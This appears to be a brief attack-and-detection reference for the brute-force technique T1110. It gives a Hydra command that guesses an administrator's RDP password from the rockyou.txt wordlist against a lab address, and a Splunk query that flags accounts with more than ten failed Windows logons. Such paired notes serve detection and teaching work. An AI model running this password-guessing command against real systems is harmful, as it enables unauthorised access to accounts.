# Brute Force Attack (T1110)

## Command
hydra -l administrator -P rockyou.txt rdp://192.168.56.100

## Detection
index=wineventlog EventCode=4625
| stats count by Account_Name
| where count > 10
